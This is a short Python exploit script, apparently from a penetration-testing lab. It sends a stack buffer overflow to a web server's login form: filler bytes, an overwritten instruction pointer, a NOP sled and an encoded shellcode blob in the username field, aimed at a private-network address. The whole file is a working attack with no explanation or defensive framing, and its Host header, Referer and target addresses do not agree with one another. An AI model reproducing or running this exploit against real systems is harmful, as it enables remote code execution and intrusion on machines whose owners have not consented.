#!/usr/bin/python

import socket

shellcode = (
"\xd9\xc5\xbb\x69\x52\xbf\xba\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x5f\x17\x83\xef\xfc\x03\x36\x41\x5d\x4f\x34\x8d\x23"
"\xb0\xc4\x4e\x44\x38\x21\x7f\x44\x5e\x22\xd0\x74\x14\x66\xdd"
"\xff\x78\x92\x56\x8d\x54\x95\xdf\x38\x83\x98\xe0\x11\xf7\xbb"
"\x62\x68\x24\x1b\x5a\xa3\x39\x5a\x9b\xde\xb0\x0e\x74\x94\x67"
"\xbe\xf1\xe0\xbb\x35\x49\xe4\xbb\xaa\x1a\x07\xed\x7d\x10\x5e"
"\x2d\x7c\xf5\xea\x64\x66\x1a\xd6\x3f\x1d\xe8\xac\xc1\xf7\x20"
"\x4c\x6d\x36\x8d\xbf\x6f\x7f\x2a\x20\x1a\x89\x48\xdd\x1d\x4e"
"\x32\x39\xab\x54\x94\xca\x0b\xb0\x24\x1e\xcd\x33\x2a\xeb\x99"
"\x1b\x2f\xea\x4e\x10\x4b\x67\x71\xf6\xdd\x33\x56\xd2\x86\xe0"
"\xf7\x43\x63\x46\x07\x93\xcc\x37\xad\xd8\xe1\x2c\xdc\x83\x6d"
"\x80\xed\x3b\x6e\x8e\x66\x48\x5c\x11\xdd\xc6\xec\xda\xfb\x11"
"\x12\xf1\xbc\x8d\xed\xfa\xbc\x84\x29\xae\xec\xbe\x98\xcf\x66"
"\x3e\x24\x1a\x28\x6e\x8a\xf5\x89\xde\x6a\xa6\x61\x34\x65\x99"
"\x92\x37\xaf\xb2\x39\xc2\x38\x7d\x15\xbb\x79\x15\x64\x43\x7b"
"\x5d\xe1\xa5\x11\xb1\xa4\x7e\x8e\x28\xed\xf4\x2f\xb4\x3b\x71"
"\x6f\x3e\xc8\x86\x3e\xb7\xa5\x94\xd7\x37\xf0\xc6\x7e\x47\x2e"
"\x6e\x1c\xda\xb5\x6e\x6b\xc7\x61\x39\x3c\x39\x78\xaf\xd0\x60"
"\xd2\xcd\x28\xf4\x1d\x55\xf7\xc5\xa0\x54\x7a\x71\x87\x46\x42"
"\x7a\x83\x32\x1a\x2d\x5d\xec\xdc\x87\x2f\x46\xb7\x74\xe6\x0e"
"\x4e\xb7\x39\x48\x4f\x92\xcf\xb4\xfe\x4b\x96\xcb\xcf\x1b\x1e"
"\xb4\x2d\xbc\xe1\x6f\xf6\xdc\x03\xa5\x03\x75\x9a\x2c\xae\x18"
"\x1d\x9b\xed\x24\x9e\x29\x8e\xd2\xbe\x58\x8b\x9f\x78\xb1\xe1"
"\xb0\xec\xb5\x56\xb0\x24")

try:
    print("\nSending evil buffer...")

    filler = "A" * 780
    eip =    "\x83\x0c\x09\x10" # The address is in reverse order, because of endian byte order
    offset = "C" * 4
    nops   = "\x90" * 10        # No Operation instructions to avoid corrupting shellcode with GetPC

    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

    buffer =  "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.192.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.193.10", 80))
    s.send(buffer)
    s.close()
    print("\nDone!")

except:
    print("Could not connect!")


